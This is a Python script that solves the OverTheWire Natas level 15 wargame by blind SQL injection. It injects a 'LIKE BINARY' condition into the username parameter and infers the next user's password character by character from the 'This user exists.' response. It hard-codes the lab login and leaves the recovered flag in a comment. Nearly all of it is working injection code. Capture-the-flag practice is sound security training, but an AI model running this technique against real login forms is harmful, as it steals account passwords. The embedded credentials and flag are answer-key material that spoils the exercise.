#!/usr/bin/env python3

import requests
import string

username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'


url = 'http://%s.natas.labs.overthewire.org' % username

# data = {
#     'username': 'natas16" AND password LIKE BINARY "W%',
#     'debug': 'hi'
# }
# response = requests.get(url, auth=(username, password), params=data)
# content = response.text

# https://mcpa.github.io/natas/wargame/web/overthewire/2015/09/29/natas15/
# characters = ''.join([string.ascii_letters, string.digits])
# dictionary = []
# exists_str = "This user exists."

# for char in characters:
#     data = {
#         'username': 'natas16" AND password LIKE BINARY "%'+char+'%',
#     }
#     req = requests.get(url, auth=(username, password), params=data)
#     if exists_str in req.text:
#         dictionary.append(char)
#         print("Dictionary: {0}".format(''.join(dictionary)))

# print("Complete Dictionary: {0}".format(''.join(dictionary)))
# dict = acehijmnpqtwBEHINORW03569

dictionary = ['a', 'c', 'e', 'h', 'i', 'j', 'm', 'n', 'p', 'q', 't', 'w', 'B', 'E', 'H', 'I', 'N', 'O', 'R', 'W', '0', '3', '5', '6', '9']
exists_str = "This user exists."

secret_list = []
secret = ''

print("Lets bruteforce...")
for i in range(1, 32):
    for char in dictionary:
        char_test = ''.join([secret, char])
        print('Trying... ' + char_test)
        data = {
            'username': 'natas16" AND password LIKE BINARY "'+char_test+'%',
        }
        req = requests.get(url, auth=(username, password), params=data)
        if exists_str in req.text:
            secret_list.append(char)
            secret = ''.join(secret_list)
            print("Length: {0}, Secret: {1}".format(len(secret),secret))
            continue

print('Flag: ' + secret)
# flag: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh